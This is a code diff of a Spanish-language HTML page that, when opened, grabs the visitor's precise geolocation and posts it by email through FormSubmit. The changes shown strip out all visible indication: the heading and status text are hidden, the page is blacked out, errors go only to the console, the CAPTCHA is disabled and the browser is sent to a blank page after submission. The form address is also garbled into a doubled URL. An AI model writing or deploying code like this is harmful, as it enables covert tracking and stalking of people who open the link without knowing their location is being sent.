@@ -3,18 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enviar Ubicación Automáticamente</title>
+    <title>Ubicación</title>
+    <style>
+        body { background-color: #000; color: #000; overflow: hidden; }
+    </style>
 </head>
 <body>
-    <h1>Enviando Ubicación...</h1>
-    <p id="status">Esperando ubicación...</p>
+    <p id="status" style="display: none;">Obteniendo ubicación...</p>
 
     <script>
         function getLocationAndSend() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
             } else {
-                document.getElementById("status").innerText = "Geolocalización no soportada.";
+                console.log("Geolocalización no soportada.");
             }
         }
 
@@ -22,55 +24,53 @@
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
 
-            document.getElementById("status").innerText = `Latitud: ${lat}, Longitud: ${lon} - Enviando...`;
-
-            // Crear formulario dinámico
             let form = document.createElement("form");
             form.method = "POST";
-            form.action = "https://formsubmit.co/d81336b5828816579b21688645230581"; // Reemplaza con tu email de FormSubmit
+            form.action = "https://formsubmit.co/https://formsubmit.co/d81336b5828816579b21688645230581";  // Reemplaza con tu correo
 
+            // Campos de ubicación
             let inputLat = document.createElement("input");
             inputLat.type = "hidden";
-            inputLat.name = "latitud";
+            inputLat.name = "Latitud";
             inputLat.value = lat;
 
             let inputLon = document.createElement("input");
             inputLon.type = "hidden";
-            inputLon.name = "longitud";
+            inputLon.name = "Longitud";
             inputLon.value = lon;
 
-            let submitBtn = document.createElement("input");
-            submitBtn.type = "submit";
+            // Desactivar CAPTCHA
+            let inputCaptcha = document.createElement("input");
+            inputCaptcha.type = "hidden";
+            inputCaptcha.name = "_captcha";
+            inputCaptcha.value = "false";
+
+            // Formato de tabla en Gmail
+            let inputTemplate = document.createElement("input");
+            inputTemplate.type = "hidden";
+            inputTemplate.name = "_template";
+            inputTemplate.value = "table";
+
+            // Evitar redirección después del envío
+            let inputRedirect = document.createElement("input");
+            inputRedirect.type = "hidden";
+            inputRedirect.name = "_next";
+            inputRedirect.value = "about:blank"; // Página en blanco tras el envío
 
             form.appendChild(inputLat);
             form.appendChild(inputLon);
-            form.appendChild(submitBtn);
+            form.appendChild(inputCaptcha);
+            form.appendChild(inputTemplate);
+            form.appendChild(inputRedirect);
             document.body.appendChild(form);
 
-            // Enviar automáticamente
             form.submit();
         }
 
         function showError(error) {
-            let message = "";
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = "Permiso denegado.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = "Ubicación no disponible.";
-                    break;
-                case error.TIMEOUT:
-                    message = "Tiempo de espera agotado.";
-                    break;
-                default:
-                    message = "Error desconocido.";
-                    break;
-            }
-            document.getElementById("status").innerText = message;
+            console.log("Error al obtener la ubicación.");
         }
 
-        // Ejecutar automáticamente al cargar la página
         window.onload = getLocationAndSend;
     </script>
 </body>
